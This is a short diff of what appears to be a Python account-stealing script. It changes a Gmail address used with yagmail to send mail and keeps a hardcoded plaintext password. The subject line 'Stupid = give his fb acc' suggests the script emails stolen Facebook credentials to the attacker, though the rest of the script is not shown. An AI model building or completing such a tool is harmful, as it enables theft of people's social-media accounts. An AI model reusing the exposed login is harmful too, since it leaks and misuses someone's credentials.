@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # coding=utf-8
 import socket,struct,os,sys,time,yagmail
-x=yagmail.SMTP('kalicodes17@gmail.com','Vlekkie.1')
+x=yagmail.SMTP('taljt2191@gmail.com','Vlekkie.1')
 subject='Stupid = give his fb acc'
 logo = """\x1b[34m
 
